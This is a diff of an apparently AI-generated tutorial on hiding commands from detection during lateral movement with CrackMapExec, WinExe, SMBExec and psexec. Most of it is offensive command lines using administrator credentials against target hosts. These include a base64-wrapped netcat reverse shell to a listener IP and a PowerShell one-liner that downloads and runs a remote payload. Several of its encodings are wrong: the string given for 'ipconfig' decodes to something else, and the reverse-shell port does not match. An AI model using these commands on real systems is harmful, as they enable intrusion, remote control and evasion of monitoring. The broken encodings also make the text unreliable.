@@ -10,8 +10,6 @@ Splitting Commands: Split the command into smaller segments to make it harder to
 Example: Base64 Encoding
 First, let's base64 encode the command you want to run (ipconfig) and pass it to the target system:
 
-bash
-Copy code
 echo "ipconfig" | base64
 This might output:
 aXBhZGQ=
@@ -34,18 +32,16 @@ Using Reverse Shells: Using reverse shell payloads can sometimes help evade dete
 Example: Base64 Encoding
 You can use a reverse shell encoded in base64:
 
-bash
-Copy code
 echo "nc -e cmd.exe 192.168.1.50 4444" | base64
 This might produce something like:
-
 bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA==
 Now, execute the CrackMapExec command with the base64 encoded reverse shell:
 
 crackmapexec smb 192.168.1.100 -u Administrator -p Password123 -x "echo bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA== | base64 -d | cmd"
-What happens here:
 
+What happens here:
 The base64 encoded reverse shell gets decoded and executed on the target.
+
 3. WinExe
 Obfuscation Techniques
 Hex Encoding: Using hex encoding for the command arguments.
@@ -53,18 +49,16 @@ Command Split: Breaking the command into smaller, less obvious chunks.
 Example: Hex Encoding
 Let's say you want to run the ipconfig command on a remote machine. First, convert ipconfig to hex:
 
-bash
-Copy code
 echo -n "ipconfig" | xxd -p
+
 This will give you:
 
 Copy code
 6970636f6e666967
 Now, use WinExe with the hex-encoded command:
 
-bash
-Copy code
 winexe -U Administrator%Password123 //<TARGET_IP> "cmd.exe /c echo 6970636f6e666967 | xxd -r -p | cmd"
+
 The command is encoded, making it less recognizable to signature-based detection tools.
 
 4. SMBExec
@@ -72,39 +66,33 @@ Obfuscation Techniques
 Base64 Encoding: Similar to the other tools, using base64 encoding or escaping the command.
 Randomized Command Execution: Splitting the command or adding seemingly random characters to the command.
 Example: Base64 Encoding
-Base64 encode the command ipconfig:
-bash
-Copy code
+
 echo "ipconfig" | base64
+
 This will output:
 
-makefile
-Copy code
 aXBhZGQ=
-Now, use SMBExec with the base64 encoded command:
-bash
-Copy code
-python smbexec.py -i 192.168.1.100 -u Administrator -p Password123 -c "echo aXBhZGQ= | base64 -d | cmd"
-Here:
 
-echo aXBhZGQ= | base64 -d decodes the base64-encoded command and runs it.
-General Obfuscation Techniques
-In addition to base64 and hex encoding, here are other general obfuscation techniques that can be applied:
+Now, use SMBExec with the base64 encoded command:
+
+python smbexec.py -i 192.168.1.100 -u Administrator -p Password123 -c "echo aXBhZGQ= | base64 -d | cmd"
+---------------------------------------------------------------------------------------------------------
 
 Environment Variables:
 
 Use environment variables to store part of the command and then call it in the main command to reduce direct exposure
+
 export CMD="ipconfig"
 psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo $CMD"
-PowerShell Scripts:
+---------------------------------------------------------------------------------
 
+PowerShell Scripts:
 You can invoke PowerShell scripts that obfuscate commands within them.
 psexec.py -U Administrator:Password123@192.168.1.100 "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
 Command Chaining:
 
 Split the command into smaller steps to evade detection. For example, use logical operators like && or || to chain multiple actions together:
-bash
-Copy code
+
 psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo ipconfig && echo more commands"
 Using cmd.exe as a Wrapper:
 
